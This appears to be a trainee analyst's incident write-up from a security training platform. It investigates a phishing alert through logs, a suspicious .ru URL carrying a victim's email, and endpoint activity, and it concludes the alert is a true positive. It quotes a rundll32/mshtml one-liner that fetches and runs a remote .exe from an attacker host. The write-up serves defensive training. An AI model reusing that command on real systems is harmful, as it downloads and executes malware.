Incident:  Phishing Mail Detected - Internal to Internal

Collect data:
Source Address: 172.16.17.49
Destination Address: 91.189.114.8
User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36


Investigation (Search Log):
  Analyzing Logs and Endpoints:
    Looking at the source and destination IP's in the logs we see this request http://mogagrocol.ru/wp-content/plugins/akismet/fv/index.php?email=ellie@letsdefend.io, this request is very suspicous. .ru sites are often used for malware campaigns, also wp-content plugins are used for that aswell. finally the last part with the paramaters (fv/index.php?email=ellie@letsdefend.io) this is not normal for a akismet directory and is probably trying to pass victim information somewhere. 

So this request is suspicous, now we need to look at endpoints. The destination is not a company endpoint but the source is. So I looked at the source endpoint and looked through Processes, network activity, browser history and terminal activity. In terminal activity I found something extremely suspicous, this command executed in the terminal: rundll32.exe javascript:'../mshtml,RunHTMLApplication ';document.write();GetObject('script:http://ru-uid-507352920.pp.ru/KBDYAK.exe')' This is almost certaintly a URL that is attempting to download a malware from a remote server. Also another factor is this system hasnt been logged into since 2020, and this was executed in 2021, at this point we are being attacked and a system is compromised. Also putting the URL into virus total it is flagged by 13 security vendors.

  Delivered (Yes/No):
    Yes, looking at the SIEM alert the URL was visited by the company system
Findings:
  After investigating the source end point the enpoint was compromised, a command was executed on it to visit a website seeming to download malware, then also visited this malicous URL. 

Conclusion:
True positive alert.

Response:
Escalation required, contained system first.
